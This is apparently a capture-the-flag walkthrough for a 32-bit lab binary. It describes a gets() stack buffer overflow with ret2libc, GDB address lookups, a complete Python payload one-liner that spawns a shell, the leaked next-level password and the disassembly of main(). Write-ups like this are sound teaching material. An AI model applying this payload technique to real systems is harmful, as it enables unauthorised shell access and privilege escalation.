# level04

##Vulnerability type:
Buffer Overflow

## Walkthrough:

The program uses the `fork` function, where the parent enters an infinite loop, and the child enters the first condition. The use of the `gets` function creates a vulnerability that can be exploited.

The debugger GDB is set to follow the child process with the command `set follow-fork-mode child`.

**Exploiting the Vulnerability:**

Since you can't make direct syscalls, you are going to use the Return-to-Libc (RET2LIBC) method. You need the addresses of `system`, `exit`, and `"/bin/sh"`.

- Address of `system`:

  ```bash
  (gdb) info function system
  [...]
  0xf7e6aed0  system
  ```

- Address of `exit`:

  ```bash
  (gdb) info function exit
  [...]
  0xf7e5eb70  exit
  ```

- Address of `"/bin/sh"`:

  ```bash
     (gdb) info proc map
     process 1763
     Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
        0x8048000  0x8049000     0x1000        0x0 /home/users/level04/level04
        0x8049000  0x804a000     0x1000        0x0 /home/users/level04/level04
        0x804a000  0x804b000     0x1000     0x1000 /home/users/level04/level04
        0xf7e2b000 0xf7e2c000     0x1000        0x0
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0
        0xf7fda000 0xf7fdb000     0x1000        0x0
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

  (gdb) find 0xf7e2c000,0xf7fd0000,"/bin/sh"
  0xf7f897ec
  ```

With this information, you can construct the payload to exploit the buffer overflow. Here's an example payload:

```bash
(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
```

This payload will execute `/bin/sh`, which will give you shell access. You can then read the flag:

```bash
cat /home/users/level05/.pass
Flag: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

## main()

```
   0x080486c8 <+0>:	push   ebp
   0x080486c9 <+1>:	mov    ebp,esp
   0x080486cb <+3>:	push   edi
   0x080486cc <+4>:	push   ebx
   0x080486cd <+5>:	and    esp,0xfffffff0
   0x080486d0 <+8>:	sub    esp,0xb0
```

```
   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
   0x080486db <+19>:	mov    DWORD PTR [esp+0xac],eax
   0x080486e2 <+26>:	lea    ebx,[esp+0x20]
   0x080486e6 <+30>:	mov    eax,0x0
   0x080486eb <+35>:	mov    edx,0x20
   0x080486f0 <+40>:	mov    edi,ebx
   0x080486f2 <+42>:	mov    ecx,edx
   0x080486f4 <+44>:	rep stos DWORD PTR es:[edi],eax
   0x080486f6 <+46>:	mov    DWORD PTR [esp+0xa8],0x0
   0x08048701 <+57>:	mov    DWORD PTR [esp+0x1c],0x0
   0x08048709 <+65>:	cmp    DWORD PTR [esp+0xac],0x0
   0x08048711 <+73>:	jne    0x8048769 <main+161>
   0x08048713 <+75>:	mov    DWORD PTR [esp+0x4],0x1
   0x0804871b <+83>:	mov    DWORD PTR [esp],0x1
   0x08048722 <+90>:	call   0x8048540 <prctl@plt>
   0x08048727 <+95>:	mov    DWORD PTR [esp+0xc],0x0
   0x0804872f <+103>:	mov    DWORD PTR [esp+0x8],0x0
   0x08048737 <+111>:	mov    DWORD PTR [esp+0x4],0x0
   0x0804873f <+119>:	mov    DWORD PTR [esp],0x0
   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
   0x0804874b <+131>:	mov    DWORD PTR [esp],0x8048903
   0x08048752 <+138>:	call   0x8048500 <puts@plt>
   0x08048757 <+143>:	lea    eax,[esp+0x20]
   0x0804875b <+147>:	mov    DWORD PTR [esp],eax
   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
   0x08048763 <+155>:	jmp    0x804881a <main+338>
   0x08048768 <+160>:	nop
   0x08048769 <+161>:	lea    eax,[esp+0x1c]
   0x0804876d <+165>:	mov    DWORD PTR [esp],eax
   0x08048770 <+168>:	call   0x80484f0 <wait@plt>
   0x08048775 <+173>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048779 <+177>:	mov    DWORD PTR [esp+0xa0],eax
   0x08048780 <+184>:	mov    eax,DWORD PTR [esp+0xa0]
   0x08048787 <+191>:	and    eax,0x7f
   0x0804878a <+194>:	test   eax,eax
   0x0804878c <+196>:	je     0x80487ac <main+228>
   0x0804878e <+198>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048792 <+202>:	mov    DWORD PTR [esp+0xa4],eax
   0x08048799 <+209>:	mov    eax,DWORD PTR [esp+0xa4]
   0x080487a0 <+216>:	and    eax,0x7f
   0x080487a3 <+219>:	add    eax,0x1
   0x080487a6 <+222>:	sar    al,1
   0x080487a8 <+224>:	test   al,al
   0x080487aa <+226>:	jle    0x80487ba <main+242>
   0x080487ac <+228>:	mov    DWORD PTR [esp],0x804891d
   0x080487b3 <+235>:	call   0x8048500 <puts@plt>
   0x080487b8 <+240>:	jmp    0x804881a <main+338>
   0x080487ba <+242>:	mov    DWORD PTR [esp+0xc],0x0
   0x080487c2 <+250>:	mov    DWORD PTR [esp+0x8],0x2c
   0x080487ca <+258>:	mov    eax,DWORD PTR [esp+0xac]
   0x080487d1 <+265>:	mov    DWORD PTR [esp+0x4],eax
   0x080487d5 <+269>:	mov    DWORD PTR [esp],0x3
   0x080487dc <+276>:	call   0x8048570 <ptrace@plt>
   0x080487e1 <+281>:	mov    DWORD PTR [esp+0xa8],eax
   0x080487e8 <+288>:	cmp    DWORD PTR [esp+0xa8],0xb
   0x080487f0 <+296>:	jne    0x8048768 <main+160>
   0x080487f6 <+302>:	mov    DWORD PTR [esp],0x8048931
   0x080487fd <+309>:	call   0x8048500 <puts@plt>
   0x08048802 <+314>:	mov    DWORD PTR [esp+0x4],0x9
   0x0804880a <+322>:	mov    eax,DWORD PTR [esp+0xac]
   0x08048811 <+329>:	mov    DWORD PTR [esp],eax
   0x08048814 <+332>:	call   0x8048520 <kill@plt>
   0x08048819 <+337>:	nop
   0x0804881a <+338>:	mov    eax,0x0
   0x0804881f <+343>:	lea    esp,[ebp-0x8]
   0x08048822 <+346>:	pop    ebx
   0x08048823 <+347>:	pop    edi
   0x08048824 <+348>:	pop    ebp
   0x08048825 <+349>:	ret
```
